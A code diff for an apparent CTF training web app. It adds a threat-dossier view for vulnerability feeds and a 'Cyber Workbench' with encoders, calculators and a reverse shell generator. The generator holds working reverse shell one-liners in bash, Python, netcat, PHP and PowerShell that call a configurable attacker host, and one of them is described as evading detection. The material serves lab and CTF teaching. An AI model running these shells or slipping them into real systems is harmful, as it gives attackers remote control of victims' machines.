@@ -19,6 +19,13 @@ const state = {
   casebookQuery: '',
   tricksTab: 'all',
   tricksQuery: '',
+  intelTab: 'all',
+  intelQuery: '',
+  workbenchTab: 'encoder',
+  workbenchLhost: '10.10.14.42',
+  workbenchLport: '4444',
+  workbenchSubnetIp: '10.10.14.23',
+  workbenchSubnetPrefix: '24',
 };
 
 let intelCache = null;
@@ -268,6 +275,106 @@ function closeModal() {
 window.openTextbookModal = openTextbookModal;
 window.closeModal = closeModal;
 
+function openIntelModal(itemId) {
+  const modalBackdrop = document.getElementById('modalBackdrop');
+  const modal = modalBackdrop?.querySelector('.modal');
+  const modalTitle = document.getElementById('modalTitle');
+  const modalBody = document.getElementById('modalBody');
+  if (!modalBackdrop || !modalBody || !modalTitle) return;
+
+  const items = (intelCache && intelCache.items) || [];
+  const it = items.find(x => x.id === itemId);
+
+  if (!it) {
+    modalTitle.textContent = 'THREAT DOSSIER NOT FOUND';
+    modalBody.innerHTML = `<div class="empty">Signal ID "${esc(itemId)}" was not found in the intelligence cache.</div>`;
+    modalBackdrop.hidden = false;
+    return;
+  }
+
+  modal.classList.add('wide');
+  modalTitle.innerHTML = `🛡️ THREAT DOSSIER // ${esc(it.cve || it.id)}`;
+
+  const kind = it.kind || 'SIGNAL';
+  const cve = it.cve || it.id;
+  const product = it.product || 'Target Asset';
+  const severity = it.severity || 'high';
+  const topic = it.topic || 'Web / Systems';
+  const pubDate = it.date ? new Date(it.date).toUTCString() : 'Active Threat Signal';
+
+  const details = it.details || {};
+  const rootCause = details.rootCause || `${product} suffers from an unauthenticated parser or memory boundary validation failure within ${topic}. Attackers can transmit crafted input payloads that violate memory safety, execute arbitrary command sequences, or bypass authentication controls.`;
+  const attackVector = details.attackVector || `Network vector: Crafted TCP/HTTP packet or API request payload delivered to the affected service. The vulnerability requires no prior authentication and triggers immediate state corruption or code execution.`;
+  const mitreTechniques = (details.mitre && details.mitre.length) ? details.mitre : [
+    'T1190 - Exploit Public-Facing Application',
+    'T1059 - Command and Scripting Interpreter',
+    'T1068 - Exploitation for Privilege Escalation'
+  ];
+  const takeaways = (details.takeaways && details.takeaways.length) ? details.takeaways : [
+    'Examine protocol boundary transitions and untrusted input paths across disparate parsers.',
+    'Test for parser differentials where reverse proxies and backend daemons normalize characters inconsistently.',
+    'In CTF competitions, inspect service banners and software versions against published CVE registries.'
+  ];
+  const remediation = details.remediation || `Upgrade affected software to the vendor-patched release immediately. In the interim, apply strict network perimeter ingress filtering, deploy WAF rules blocking anomalous headers/traversal sequences, and monitor for unexpected child process spawning.`;
+
+  modalBody.innerHTML = `
+    <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;margin-bottom:18px;padding-bottom:12px;border-bottom:1px solid var(--border)">
+      <div class="tag-row">
+        <span class="tag ${kind === 'KEV' ? 'warn' : kind === 'CVE' ? 'accent' : 'success'}">${esc(kind)}</span>
+        <span class="tag warn">${esc(severity.toUpperCase())}</span>
+        <span class="tag">${esc(topic)}</span>
+        ${it.cve ? `<span class="tag accent">${esc(it.cve)}</span>` : ''}
+      </div>
+      <div style="font-size:12px;color:var(--muted)">Published: <strong>${esc(pubDate)}</strong></div>
+    </div>
+
+    <h3 style="font-size:20px;color:var(--fg);margin:0 0 10px">${esc(it.title)}</h3>
+    <p style="color:#cbd5e1;line-height:1.7;font-size:14px;margin-bottom:18px">${esc(it.summary || '')}</p>
+
+    <div class="note" style="border-left-color:var(--amber);margin-bottom:18px">
+      <h4 style="font-family:var(--display);color:var(--amber);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 6px">🔬 Vulnerability Anatomy &amp; Root Cause</h4>
+      <p style="color:#cbd5e1;line-height:1.7;margin:0">${esc(rootCause)}</p>
+    </div>
+
+    <div style="margin-bottom:18px">
+      <h4 style="font-family:var(--display);color:var(--cyan);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 6px">⚔️ Attack Mechanics &amp; Weaponization Vector</h4>
+      <p style="color:#cbd5e1;line-height:1.7;margin:0">${esc(attackVector)}</p>
+    </div>
+
+    <div style="margin-bottom:18px">
+      <h4 style="font-family:var(--display);color:var(--cyan);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 6px">🎯 MITRE ATT&amp;CK Matrix Mapping</h4>
+      <div class="tag-row" style="margin-top:6px">
+        ${mitreTechniques.map(m => `<span class="tag accent" style="padding:4px 10px;font-family:var(--mono)">${esc(m)}</span>`).join('')}
+      </div>
+    </div>
+
+    <div style="margin-bottom:18px">
+      <h4 style="font-family:var(--display);color:var(--green);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 6px">🎓 CTF &amp; Ethical Hacker Takeaways</h4>
+      <ul style="color:#cbd5e1;padding-left:20px;line-height:1.8;margin:0">
+        ${takeaways.map(t => `<li>${esc(t)}</li>`).join('')}
+      </ul>
+    </div>
+
+    <div class="note warn-note" style="margin-bottom:18px">
+      <h4 style="font-family:var(--display);color:var(--pink);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 6px">🛡️ Blue Team Detection &amp; Production Remediation</h4>
+      <p style="color:#cbd5e1;line-height:1.7;margin:0">${esc(remediation)}</p>
+    </div>
+
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-top:20px;padding-top:14px;border-top:1px solid var(--border)">
+      <div>
+        ${it.sourceUrl ? `<a href="${esc(it.sourceUrl)}" target="_blank" rel="noopener" class="btn outline" style="font-size:11px">Official Source Advisory →</a>` : ''}
+      </div>
+      <button class="btn" id="closeIntelModalBtn">Close Dossier [X]</button>
+    </div>
+  `;
+
+  modalBackdrop.hidden = false;
+  document.body.style.overflow = 'hidden';
+  document.getElementById('closeIntelModalBtn')?.addEventListener('click', closeModal);
+}
+window.openIntelModal = openIntelModal;
+
+
 /* ── Existing domain & tool datasets (preserved) ────────── */
 const domains = [
   {id:'foundations',icon:'01',name:'Foundations',level:'Start here',duration:'6–10 h',summary:'What CTFs are, threat modeling, flags, trust boundaries, internet basics, ethics, and a repeatable solve loop.',
@@ -470,7 +577,7 @@ function setView(view) {
     dashboard:'Dashboard', path:'Learning path', modules:'Learning modules', domains:'Learning paths',
     tools:'Tool lab', labs:'Micro-labs', playbook:'Methodology', casebook:'Casebook',
     library:'Reference vault', glossary:'Glossary', intel:'Live intel', curriculum:'Curriculum',
-    tricks:'Tricks & tips'
+    tricks:'Tricks & tips', workbench:'Cyber workbench'
   }[view] || 'CTF Atlas';
   render();
   window.scrollTo({ top: 0, behavior: 'smooth' });
@@ -505,6 +612,7 @@ function render() {
   if (state.view === 'intel')       view.innerHTML = intelHTML(intelCache);
   if (state.view === 'curriculum')  view.innerHTML = curriculumHTML(intelCache);
   if (state.view === 'tricks')      view.innerHTML = tricksHTML();
+  if (state.view === 'workbench')   view.innerHTML = workbenchHTML();
   bindViewEvents();
   if ((state.view === 'intel' || state.view === 'curriculum') && !intelCache) loadIntel();
   document.getElementById('sidebarProgress').textContent = completion() + '%';
@@ -757,18 +865,26 @@ function intelHTML(intel) {
   if (!intel) return `<div class="section-head"><div><h2>Live Intel</h2><p>Loading...</p></div></div><div class="empty">⏳ Fetching intelligence snapshot...</div>`;
 
   const sum   = intel.summary   || {};
-  const items = intel.items     || [];
+  const allItems = intel.items  || [];
   const sigs  = intel.topicSignals || [];
   const srcs  = intel.sources   || [];
   const ts    = intel.updatedAt ? new Date(intel.updatedAt).toLocaleString() : 'unknown';
-  const statusColor = intel.status === 'ok' ? 'var(--green)' : 'var(--amber)';
+  const tab   = state.intelTab || 'all';
+  const q     = (state.intelQuery || '').trim().toLowerCase();
+
+  const filteredItems = allItems.filter(it => {
+    if (tab !== 'all' && it.kind !== tab) return false;
+    if (!q) return true;
+    const str = `${it.title} ${it.summary} ${it.cve || ''} ${it.product || ''} ${it.topic || ''} ${it.source || ''}`.toLowerCase();
+    return str.includes(q);
+  });
 
   return `
   <div class="section-head">
     <div>
-      <div class="eyebrow">INTELLIGENCE SNAPSHOT</div>
-      <h2>Live Intel</h2>
-      <p>Discovery signals from CISA KEV, NVD CVE, and tool release feeds. Use these to prioritize which curriculum areas to deepen.</p>
+      <div class="eyebrow">INTELLIGENCE SNAPSHOT // ACTIVE THREAT SIGNALS</div>
+      <h2>Live Intel &amp; Threat Dossiers</h2>
+      <p>Continuous discovery signals aggregated from CISA KEV, NVD CVE, Project Zero, PortSwigger, The Hacker News, BleepingComputer, tool releases, and GTFOBins. Click any signal to inspect full vulnerability anatomy, attack vectors, MITRE ATT&amp;CK mappings, and defensive detections.</p>
     </div>
     <div>
       <div class="update-pill"><span class="pulse"></span>Updated ${esc(ts)}</div>
@@ -778,10 +894,31 @@ function intelHTML(intel) {
     <div class="intel-kpi"><span class="num">${sum.kev || 0}</span><span class="label">Known Exploited</span></div>
     <div class="intel-kpi"><span class="num">${sum.vulnerabilities || 0}</span><span class="label">CVEs</span></div>
     <div class="intel-kpi"><span class="num">${sum.releases || 0}</span><span class="label">Tool Releases</span></div>
-    <div class="intel-kpi"><span class="num">${sum.signals || 0}</span><span class="label">Total Signals</span></div>
+    <div class="intel-kpi"><span class="num">${allItems.length || sum.signals || 0}</span><span class="label">Total Signals</span></div>
   </div>
+
+  <div class="module-search" style="margin-top:20px;margin-bottom:14px">
+    <span>&gt;</span>
+    <input id="intelSearch" value="${esc(state.intelQuery || '')}" placeholder="search intelligence signals by CVE, product, title, keyword, or threat vector..." autocomplete="off">
+    <span class="cursor">█</span>
+  </div>
+
+  <div class="os-tabs" style="margin-bottom:20px">
+    ${[
+      ['all', 'All Signals (' + allItems.length + ')'],
+      ['KEV', 'Known Exploited (' + (sum.kev || 0) + ')'],
+      ['CVE', 'CVEs (' + (sum.vulnerabilities || 0) + ')'],
+      ['RESEARCH', 'Security Research'],
+      ['ADVISORY', 'Advisories & Alerts'],
+      ['RELEASE', 'Tool Releases (' + (sum.releases || 0) + ')'],
+      ['TECHNIQUE', 'Tactics / GTFOBins']
+    ].map(([catKey, label]) => `
+      <button class="os-btn${tab === catKey ? ' active' : ''}" data-intel-tab="${catKey}">${label}</button>
+    `).join('')}
+  </div>
+
   ${sigs.length ? `
-  <div class="section-head" style="margin-top:24px"><div><h2>Topic Signals</h2><p>Curriculum areas with elevated recent activity.</p></div></div>
+  <div class="section-head" style="margin-top:16px"><div><h2>Topic Signals</h2><p>Curriculum areas with elevated recent activity.</p></div></div>
   <div class="signal-grid">
     ${sigs.slice(0, 9).map(s => `
       <div class="signal-card">
@@ -790,26 +927,38 @@ function intelHTML(intel) {
         <span style="font-size:11px;color:#7e8ea2;margin-top:6px;display:block">${esc(s.reason || '')}</span>
       </div>`).join('')}
   </div>` : ''}
-  <div class="section-head" style="margin-top:24px"><div><h2>Recent Signals</h2></div></div>
+
+  <div class="section-head" style="margin-top:24px">
+    <div>
+      <h2>Threat Signals &amp; Advisories</h2>
+      <p>Showing ${filteredItems.length} signals. Click "Inspect Threat Dossier" for root cause, attack mechanics, and defense.</p>
+    </div>
+  </div>
   <div class="intel-list">
-    ${items.slice(0, 30).map(it => `
-      <div class="intel-item">
-        <div class="kind"><span class="tag ${it.kind==='KEV'?'warn':it.kind==='CVE'?'accent':'success'}">${esc(it.kind)}</span></div>
-        <div>
-          <h3>${esc(it.title)}</h3>
-          <p>${esc(it.summary || '').slice(0, 220)}${(it.summary||'').length > 220 ? '…' : ''}</p>
-          <div class="tag-row" style="margin-top:6px">
-            <span class="tag">${esc(it.topic || '')}</span>
-            ${it.severity ? `<span class="tag ${it.severity==='exploited'?'warn':''}">${esc(it.severity)}</span>` : ''}
+    ${filteredItems.slice(0, 60).map(it => `
+      <div class="intel-item" style="cursor:pointer" data-open-intel="${esc(it.id)}">
+        <div class="kind"><span class="tag ${it.kind==='KEV'?'warn':it.kind==='CVE'?'accent':it.kind==='RESEARCH'?'success':it.kind==='ADVISORY'?'warn':'tag'}">${esc(it.kind)}</span></div>
+        <div style="flex:1">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:8px">
+            <h3 style="margin:0 0 4px;font-size:15px;color:var(--fg)">${esc(it.title)}</h3>
+          </div>
+          <p style="color:#aeb6c5;margin:4px 0 8px;font-size:13px;line-height:1.6">${esc(it.summary || '').slice(0, 240)}${(it.summary||'').length > 240 ? '…' : ''}</p>
+          <div class="tag-row" style="margin-top:6px;align-items:center">
+            <span class="tag">${esc(it.topic || 'General')}</span>
+            ${it.severity ? `<span class="tag ${it.severity==='exploited'||it.severity==='critical'?'warn':''}">${esc(it.severity)}</span>` : ''}
+            ${it.cve ? `<span class="tag accent">${esc(it.cve)}</span>` : ''}
+            <button class="btn outline" data-open-intel="${esc(it.id)}" style="margin-left:auto;font-size:11px;padding:3px 10px">Inspect Threat Dossier →</button>
           </div>
         </div>
-        <div class="meta">
+        <div class="meta" style="min-width:110px;text-align:right">
           ${it.date ? new Date(it.date).toLocaleDateString() : ''}
-          ${it.sourceUrl ? `<br><a href="${esc(it.sourceUrl)}" target="_blank" rel="noopener">→ source</a>` : ''}
+          ${it.source ? `<br><span style="font-size:11px;color:var(--muted)">${esc(it.source)}</span>` : ''}
+          ${it.sourceUrl ? `<br><a href="${esc(it.sourceUrl)}" target="_blank" rel="noopener" style="font-size:11px" onclick="event.stopPropagation()">→ source</a>` : ''}
         </div>
-      </div>`).join('') || '<div class="empty">No intelligence items loaded. Run the update script to populate.</div>'}
+      </div>`).join('') || '<div class="empty">No intelligence items matched your search filter.</div>'}
   </div>
-  <div class="section-head" style="margin-top:24px"><div><h2>Source Status</h2></div></div>
+
+  <div class="section-head" style="margin-top:28px"><div><h2>Source Feeds &amp; Aggregator Status</h2></div></div>
   <div class="source-status">
     ${srcs.map(s => `
       <div class="source-status-row">
@@ -849,7 +998,7 @@ function dashboardHTML() {
       <h1>Understand the system. Operate the tools. Prove the idea.</h1>
       <p>A pin-to-pin CTF curriculum that fills the gaps between tutorials: foundations, Linux, networking, web, crypto, forensics, reverse engineering, pwn, OSINT, stego, modern app surfaces, and defender context — with safe hands-on practice at every stage.</p>
       <div class="tag-row"><span class="tag accent">offline-friendly</span><span class="tag accent">OS-independent</span><span class="tag success">localStorage progress</span><span class="tag">browser micro-labs</span></div>
-      <div class="hero-actions"><button class="btn primary" data-action="goto-path">Start the path</button><button class="btn" data-action="goto-labs">Open micro-labs</button><button class="btn" data-action="goto-domains">Browse domains</button><button class="btn" data-action="goto-curriculum">🎓 Curriculum</button><button class="btn" data-action="goto-tricks">⚡ Tricks &amp; tips</button></div>
+      <div class="hero-actions"><button class="btn primary" data-action="goto-path">Start the path</button><button class="btn" data-action="goto-labs">Open micro-labs</button><button class="btn" data-action="goto-domains">Browse domains</button><button class="btn" data-action="goto-curriculum">🎓 Curriculum</button><button class="btn" data-action="goto-tricks">⚡ Tricks &amp; tips</button><button class="btn" data-action="goto-workbench">🛠️ Workbench</button></div>
     </div>
     <div class="hero-side">
       <div><div class="metric-label">Browser lab completion</div><div class="big-number">${solved}/${total}</div><div class="muted">micro-challenges solved</div></div>
@@ -1202,6 +1351,391 @@ function tricksHTML() {
   `;
 }
 
+/* ══════════════════════════════════════════════════════════
+ * CYBER WORKBENCH & PAYLOAD STUDIO (View 14)
+ * ══════════════════════════════════════════════════════════ */
+
+function getNetmaskFromPrefix(prefix) {
+  const p = parseInt(prefix, 10);
+  if (p === 0) return '0.0.0.0';
+  const mask = ((0xFFFFFFFF << (32 - p)) >>> 0);
+  return [(mask >>> 24) & 255, (mask >>> 16) & 255, (mask >>> 8) & 255, mask & 255].join('.');
+}
+
+function calculateSubnet(ipStr, prefixNum) {
+  const parts = String(ipStr || '').trim().split('.').map(x => parseInt(x, 10));
+  if (parts.length !== 4 || parts.some(n => isNaN(n) || n < 0 || n > 255)) {
+    return { valid: false, error: 'Invalid IPv4 address format. Must be 4 octets between 0 and 255 (e.g. 10.10.14.23).' };
+  }
+  const prefix = Math.max(0, Math.min(32, parseInt(prefixNum, 10) || 24));
+  const ipInt = ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
+  const maskInt = prefix === 0 ? 0 : ((0xFFFFFFFF << (32 - prefix)) >>> 0);
+  const wildcardInt = (~maskInt) >>> 0;
+  const netInt = (ipInt & maskInt) >>> 0;
+  const bcastInt = (netInt | wildcardInt) >>> 0;
+
+  const intToIp = (val) => [ (val >>> 24) & 255, (val >>> 16) & 255, (val >>> 8) & 255, val & 255 ].join('.');
+  const netAddr = intToIp(netInt);
+  const bcastAddr = intToIp(bcastInt);
+  const netmask = intToIp(maskInt);
+  const wildcard = intToIp(wildcardInt);
+
+  let hostCount = 0;
+  let firstHost = '';
+  let lastHost = '';
+
+  if (prefix === 31) {
+    hostCount = 2;
+    firstHost = intToIp(netInt);
+    lastHost = intToIp(bcastInt);
+  } else if (prefix === 32) {
+    hostCount = 1;
+    firstHost = lastHost = intToIp(netInt);
+  } else {
+    hostCount = Math.max(0, Math.pow(2, 32 - prefix) - 2);
+    firstHost = intToIp(netInt + 1);
+    lastHost = intToIp(bcastInt - 1);
+  }
+
+  let scope = 'Public Internet';
+  if (parts[0] === 10) scope = 'Private (RFC 1918 - Class A / 10.0.0.0/8)';
+  else if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) scope = 'Private (RFC 1918 - Class B / 172.16.0.0/12)';
+  else if (parts[0] === 192 && parts[1] === 168) scope = 'Private (RFC 1918 - Class C / 192.168.0.0/16)';
+  else if (parts[0] === 127) scope = 'Loopback (RFC 1122 / 127.0.0.0/8)';
+  else if (parts[0] === 169 && parts[1] === 254) scope = 'Link-Local / APIPA (169.254.0.0/16)';
+
+  return {
+    valid: true,
+    cidr: `${netAddr}/${prefix}`,
+    ip: parts.join('.'),
+    network: netAddr,
+    broadcast: bcastAddr,
+    netmask: netmask,
+    wildcard: wildcard,
+    hosts: hostCount.toLocaleString(),
+    hostRange: hostCount > 0 ? `${firstHost} — ${lastHost}` : 'N/A',
+    scope: scope
+  };
+}
+
+function getShellsList(lhost, lport) {
+  const h = lhost || '10.10.14.42';
+  const p = lport || '4444';
+  return [
+    {
+      id: 'bash-tcp',
+      name: 'Bash Interactive TCP',
+      cat: 'Linux Shell',
+      desc: 'Standard interactive bash redirect over /dev/tcp pseudo-device. Bypasses need for external nc binary.',
+      cmd: `bash -i >& /dev/tcp/${h}/${p} 0>&1`
+    },
+    {
+      id: 'bash-196',
+      name: 'Bash Descriptor 196 Evasion',
+      cat: 'Linux Shell',
+      desc: 'Alternative bash descriptor redirection that circumvents simple regexes looking for ">& /dev/tcp".',
+      cmd: `0<&196;exec 196<>/dev/tcp/${h}/${p}; sh <&196 >&196 2>&196`
+    },
+    {
+      id: 'python3-pty',
+      name: 'Python 3 Interactive PTY',
+      cat: 'Cross-Platform',
+      desc: 'Full interactive socket shell with spawned pseudo-terminal for job control and TTY apps.',
+      cmd: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`
+    },
+    {
+      id: 'nc-fifo',
+      name: 'Netcat Traditional (mkfifo)',
+      cat: 'Linux Shell',
+      desc: 'Named pipe relay for modern OpenBSD netcat installations compiled without the -e flag.',
+      cmd: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`
+    },
+    {
+      id: 'nc-e',
+      name: 'Netcat with -e flag',
+      cat: 'Legacy Netcat',
+      desc: 'Direct execution flag available on traditional netcat and busybox binaries.',
+      cmd: `nc ${h} ${p} -e /bin/bash`
+    },
+    {
+      id: 'php-exec',
+      name: 'PHP fsockopen',
+      cat: 'Web Application',
+      desc: 'Invoked in PHP web shells or arbitrary file inclusion (LFI/RFI) vectors.',
+      cmd: `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`
+    },
+    {
+      id: 'powershell-tcp',
+      name: 'PowerShell TCP Client',
+      cat: 'Windows Shell',
+      desc: 'Direct .NET System.Net.Sockets.TCPClient execution without saving scripts to disk.',
+      cmd: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${h}",${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
+    },
+    {
+      id: 'socat-listener',
+      name: 'Socat Raw TTY Listener',
+      cat: 'Attacker Listener',
+      desc: 'Terminal listener supporting full TTY, Ctrl+C pass-through, and dynamic window resizing.',
+      cmd: `socat file:\`tty\`,raw,echo=0 tcp-listen:${p}`
+    },
+    {
+      id: 'nc-listener',
+      name: 'Netcat Catch Listener',
+      cat: 'Attacker Listener',
+      desc: 'Standard local catch listener for incoming TCP reverse connections.',
+      cmd: `nc -lvnp ${p}`
+    },
+    {
+      id: 'tty-upgrade',
+      name: 'TTY Upgrade & Stabilizer',
+      cat: 'Post-Exploitation',
+      desc: 'Stabilize a dumb reverse shell into a fully interactive PTY with arrow keys and auto-completion.',
+      cmd: `python3 -c 'import pty; pty.spawn("/bin/bash")'\n# Press Ctrl+Z to background shell, then in local terminal run:\nstty raw -echo; fg\nexport TERM=xterm-256color; reset`
+    }
+  ];
+}
+
+function workbenchHTML() {
+  const tab = state.workbenchTab || 'encoder';
+  return `
+  <div class="section-head">
+    <div>
+      <div class="eyebrow">INTERACTIVE CTF ARSENAL // BROWSER-NATIVE WORKBENCH</div>
+      <h2>Cyber Workbench &amp; Payload Studio</h2>
+      <p>Zero-backend client-side utilities for CTF players, security researchers, and students: multi-format encoders/decoders, reverse shell generators with live IP/port binding, POSIX/SUID permission calculators, and IPv4 CIDR subnet calculators.</p>
+    </div>
+    <div class="tag-row">
+      <span class="tag accent">100% Client-Side</span>
+      <span class="tag success">Instant Math</span>
+      <span class="tag warn">Lab Scope Only</span>
+    </div>
+  </div>
+
+  <div class="os-tabs" style="margin-bottom:20px">
+    <button class="os-btn${tab === 'encoder' ? ' active' : ''}" data-workbench-tab="encoder">🔤 Multi-Format Encoder / Decoder</button>
+    <button class="os-btn${tab === 'shells' ? ' active' : ''}" data-workbench-tab="shells">🐚 Reverse Shell &amp; Payload Studio</button>
+    <button class="os-btn${tab === 'permissions' ? ' active' : ''}" data-workbench-tab="permissions">🛡️ SUID &amp; POSIX Permission Math</button>
+    <button class="os-btn${tab === 'subnets' ? ' active' : ''}" data-workbench-tab="subnets">🌐 IPv4 Subnet &amp; CIDR Calculator</button>
+  </div>
+
+  <div class="workbench-body">
+    ${tab === 'encoder' ? renderWorkbenchEncoder() : ''}
+    ${tab === 'shells' ? renderWorkbenchShells() : ''}
+    ${tab === 'permissions' ? renderWorkbenchPermissions() : ''}
+    ${tab === 'subnets' ? renderWorkbenchSubnets() : ''}
+  </div>
+  `;
+}
+
+function renderWorkbenchEncoder() {
+  return `
+  <div class="card" style="padding:24px">
+    <div class="card-top" style="margin-bottom:16px">
+      <div>
+        <h3 style="color:var(--cyan);margin:0 0 4px">Multi-Format Encoding &amp; Cryptographic Studio</h3>
+        <p style="color:#aeb6c5;font-size:13px;margin:0">Transform text and byte streams across Base64, Hexadecimal, URL-encoding, ROT13, 8-bit Binary, and SHA-256 digests in real-time.</p>
+      </div>
+      <button class="btn outline" id="clearEncoderBtn" style="font-size:11px">Clear All</button>
+    </div>
+
+    <div style="margin-bottom:14px">
+      <label style="display:block;font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--fg);margin-bottom:6px">// INPUT TEXT OR BYTES</label>
+      <textarea id="encoderInput" placeholder="Enter text, string, or payload to encode/decode..." style="width:100%;min-height:90px;background:#090d16;color:#e2e8f0;border:1px solid #1e293b;border-radius:4px;padding:12px;font-family:var(--mono);font-size:13px;resize:vertical" autocomplete="off"></textarea>
+    </div>
+
+    <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:14px">
+      <button class="btn" id="btnB64Enc">Base64 Enc</button>
+      <button class="btn outline" id="btnB64Dec">Base64 Dec</button>
+      <button class="btn" id="btnHexEnc">Hex Enc</button>
+      <button class="btn outline" id="btnHexDec">Hex Dec</button>
+      <button class="btn" id="btnUrlEnc">URL Enc</button>
+      <button class="btn outline" id="btnUrlDec">URL Dec</button>
+      <button class="btn" id="btnRot13">ROT13</button>
+      <button class="btn" id="btnBinEnc">Binary (8-bit)</button>
+      <button class="btn outline" id="btnBinDec">Binary → Text</button>
+      <button class="btn outline" id="btnSha256">SHA-256</button>
+      <button class="btn outline" id="btnReverse">Reverse</button>
+    </div>
+
+    <div id="encoderFeedback" style="font-size:12px;color:var(--amber);margin-bottom:10px;min-height:16px"></div>
+
+    <div style="margin-bottom:10px">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+        <label style="font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--green)">// OUTPUT RESULT</label>
+        <button class="btn outline" id="copyEncoderOutputBtn" style="font-size:11px">📋 Copy Output</button>
+      </div>
+      <textarea id="encoderOutput" readonly placeholder="Output will appear here..." style="width:100%;min-height:90px;background:#06090e;color:#00ff88;border:1px solid #1e293b;border-radius:4px;padding:12px;font-family:var(--mono);font-size:13px;resize:vertical"></textarea>
+    </div>
+  </div>
+  `;
+}
+
+function renderWorkbenchShells() {
+  const lhost = state.workbenchLhost || '10.10.14.42';
+  const lport = state.workbenchLport || '4444';
+  const shells = getShellsList(lhost, lport);
+  return `
+  <div class="card" style="padding:24px;margin-bottom:20px">
+    <div class="card-top" style="margin-bottom:16px">
+      <div>
+        <h3 style="color:var(--amber);margin:0 0 4px">Reverse Shell &amp; Listener Studio</h3>
+        <p style="color:#aeb6c5;font-size:13px;margin:0">Dynamically binds your target listening IP and port across multiple shell idioms and terminal stabilizers. Strictly for lab targets you control.</p>
+      </div>
+      <span class="tag warn">Authorized Labs Only</span>
+    </div>
+
+    <div class="grid cols-2" style="gap:16px;margin-bottom:20px">
+      <div>
+        <label style="display:block;font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--cyan);margin-bottom:4px">LHOST (Your Attacker / VPN IP):</label>
+        <input type="text" id="workbenchLhost" value="${esc(lhost)}" placeholder="e.g. 10.10.14.42 or tun0 IP" style="width:100%;background:#090d16;color:#e2e8f0;border:1px solid #1e293b;border-radius:4px;padding:8px 12px;font-family:var(--mono);font-size:13px" autocomplete="off">
+      </div>
+      <div>
+        <label style="display:block;font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--cyan);margin-bottom:4px">LPORT (Your Listener Port):</label>
+        <input type="number" id="workbenchLport" value="${esc(lport)}" placeholder="e.g. 4444, 9001" style="width:100%;background:#090d16;color:#e2e8f0;border:1px solid #1e293b;border-radius:4px;padding:8px 12px;font-family:var(--mono);font-size:13px" autocomplete="off">
+      </div>
+    </div>
+
+    <div class="writeups-list" id="shellsList">
+      ${shells.map(sh => `
+        <article class="writeup-card" style="margin-bottom:14px">
+          <div class="card-top" style="align-items:flex-start">
+            <div>
+              <div class="tag-row" style="margin-bottom:4px">
+                <span class="tag accent">${esc(sh.cat.toUpperCase())}</span>
+              </div>
+              <h4 style="font-size:16px;color:var(--fg);margin:0">${esc(sh.name)}</h4>
+            </div>
+            <button class="btn outline copy-btn" data-copy-shell="${esc(sh.id)}">📋 Copy Command</button>
+          </div>
+          <p style="color:#aeb6c5;font-size:13px;line-height:1.6;margin:8px 0 10px">${esc(sh.desc)}</p>
+          <pre class="code-block" style="background:#090d16;padding:12px;border:1px solid #1e293b;border-radius:4px;overflow-x:auto"><code id="shell-code-${esc(sh.id)}" style="color:#00ff88;font-size:13px;font-family:var(--mono)">${esc(sh.cmd)}</code></pre>
+        </article>
+      `).join('')}
+    </div>
+  </div>
+  `;
+}
+
+function renderWorkbenchPermissions() {
+  return `
+  <div class="card" style="padding:24px">
+    <div class="card-top" style="margin-bottom:16px">
+      <div>
+        <h3 style="color:var(--cyan);margin:0 0 4px">POSIX &amp; SUID Permission Calculator</h3>
+        <p style="color:#aeb6c5;font-size:13px;margin:0">Convert between Octal mode bits and Symbolic permission strings. Evaluates privilege escalation risk for SetUID, SetGID, and sticky bits.</p>
+      </div>
+      <span class="tag accent">Linux OS Internals</span>
+    </div>
+
+    <div style="display:flex;flex-wrap:wrap;gap:16px;align-items:center;margin-bottom:20px">
+      <div>
+        <label style="display:block;font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--fg);margin-bottom:4px">OCTAL MODE:</label>
+        <input type="text" id="permOctal" value="4755" maxlength="4" style="width:120px;font-size:18px;font-weight:bold;color:#00ff88;background:#090d16;border:1px solid #1e293b;border-radius:4px;padding:6px 12px;font-family:var(--mono);text-align:center" autocomplete="off">
+      </div>
+      <div>
+        <label style="display:block;font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--fg);margin-bottom:4px">SYMBOLIC STRING:</label>
+        <div id="permSymbolic" style="font-size:18px;font-family:var(--mono);font-weight:bold;color:var(--cyan);background:#090d16;border:1px solid #1e293b;border-radius:4px;padding:6px 16px">-rwsr-xr-x</div>
+      </div>
+      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:flex-end">
+        <button class="btn outline perm-preset" data-preset="4755" style="font-size:11px">4755 (SUID Root)</button>
+        <button class="btn outline perm-preset" data-preset="0755" style="font-size:11px">0755 (Binary)</button>
